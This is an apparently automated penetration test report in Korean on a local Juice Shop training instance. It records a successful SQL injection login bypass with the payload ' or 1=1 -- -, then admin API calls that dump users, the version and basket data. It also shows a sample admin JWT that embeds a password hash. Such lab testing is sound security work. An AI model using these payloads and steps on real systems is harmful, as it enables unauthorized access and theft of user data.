# Pentest Report: 20260813-163307-juice-shop
## Summary

- 대상: 127.0.0.1
- 진행된 단계: exploitation, web_agent
- 총 findings: 7


## Exploitation

### 127.0.0.1

- **[성공]** port 3000 - SQL Injection (email, /rest/user/login) (방법: SQLi(local-known-payload))
  - 로컬 직접 검증 성공: ' or 1=1 -- -
- **[성공]** port 3000 - SQL Injection (email, /rest/user/login) (방법: SQLi(local-known-payload))
  - 로컬 직접 검증 성공: ' or 1=1 -- -


## Web Post-Exploitation

### 127.0.0.1

- 테스트 과정:
  - `try_login_bypass(local-known-payload)` (/rest/user/login)
  - `list_users` (/api/Users)
  - `application_version` (/rest/admin/application-version)
  - `basket_items` (/api/BasketItems/)
- 최종 결과: **[성공]** 로컬 Juice Shop에서 로그인 SQLi로 관리자 JWT를 획득했고, 인증된 관리자 API 접근까지 확인했다. list_users: {"status":"success","data":[{"id":1,"username":"","email":"admin@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-08-13T03:14:54.142Z","upda
... (생략됨, 원래 6342자) / application_version: {"version":"20.1.1"} / basket_items: {"status":"success","data":[{"ProductId":1,"BasketId":1,"id":1,"quantity":2,"createdAt":"2026-08-13T03:14:54.899Z","updatedAt":"2026-08-13T03:14:54.899Z"},{"ProductId":2,"BasketId":1,"id":2,"quantity":3,"createdAt":"2026-08-13T03:14:54.899Z","updated
... (생략됨, 원래 1045자)
  - 응답 샘플:
    ```
    {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOC0xMyAwMzoxNDo1NC4xNDIgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOC0xMyAwMzoxNDo1NC4xNDIgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODY2Mzg3ODl9.FvdcAPLsQdIFN2WaX1UIrPETm5yjI6l5jtFf7bPd0V4tgHvqn7YhWbIzyNwRfKXM7xcWwZ5Hi9qWRz46BkNALU_hPu2tTgLK51cuBfU9-wwFiB6ns1rIPEweYb-36sTzTBc5JMi2NWE_phiq_jJDLtmxgiLUnZNqI8vcMAIRgEU","bid":1,"umail":"admin@juice-sh.op"}}
    ```

